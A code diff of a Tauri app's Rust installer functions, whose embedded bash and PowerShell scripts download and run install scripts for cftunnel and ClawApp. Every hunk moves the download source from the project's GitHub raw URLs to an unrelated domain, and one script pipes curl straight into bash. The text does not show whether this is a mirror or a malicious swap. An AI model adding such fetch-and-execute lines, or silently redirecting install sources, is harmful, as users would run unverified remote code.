@@ -345,7 +345,7 @@ pub async fn install_cftunnel(app: tauri::AppHandle) -> Result<String, String> {
 set -e
 cd /tmp
 echo "下载 cftunnel..."
-curl -fsSL https://raw.githubusercontent.com/qingchencloud/cftunnel/main/install.sh -o cftunnel-install.sh
+curl -fsSL https://ai.aizuopin.com/raw/cftunnel/main/install.sh -o cftunnel-install.sh
 chmod +x cftunnel-install.sh
 echo "执行安装..."
 ./cftunnel-install.sh
@@ -367,7 +367,7 @@ $ErrorActionPreference = 'Stop'
 Write-Output '通过官方安装脚本安装 cftunnel...'
 $tmp = Join-Path $env:TEMP 'install-cftunnel.ps1'
 Write-Output '下载安装脚本到临时文件...'
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/qingchencloud/cftunnel/main/install.ps1' -OutFile $tmp -UseBasicParsing
+Invoke-WebRequest -Uri 'https://ai.aizuopin.com/raw/cftunnel/main/install.ps1' -OutFile $tmp -UseBasicParsing
 Write-Output '执行安装脚本...'
 & $tmp
 Remove-Item $tmp -ErrorAction SilentlyContinue
@@ -453,7 +453,7 @@ pub async fn install_clawapp(app: tauri::AppHandle) -> Result<String, String> {
 #!/bin/bash
 set -e
 echo "通过官方安装脚本安装 ClawApp..."
-curl -fsSL https://raw.githubusercontent.com/qingchencloud/clawapp/main/install.sh | bash
+curl -fsSL https://ai.aizuopin.com/raw/clawapp/main/install.sh | bash
 echo "安装完成"
 "#;
         Command::new("bash")
@@ -472,7 +472,7 @@ $ErrorActionPreference = 'Stop'
 Write-Output '通过官方安装脚本安装 ClawApp...'
 $tmp = Join-Path $env:TEMP 'install-clawapp.ps1'
 Write-Output '下载安装脚本到临时文件...'
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/qingchencloud/clawapp/main/install.ps1' -OutFile $tmp -UseBasicParsing
+Invoke-WebRequest -Uri 'https://ai.aizuopin.com/raw/clawapp/main/install.ps1' -OutFile $tmp -UseBasicParsing
 Write-Output '执行安装脚本...'
 & $tmp -Auto
 Remove-Item $tmp -ErrorAction SilentlyContinue
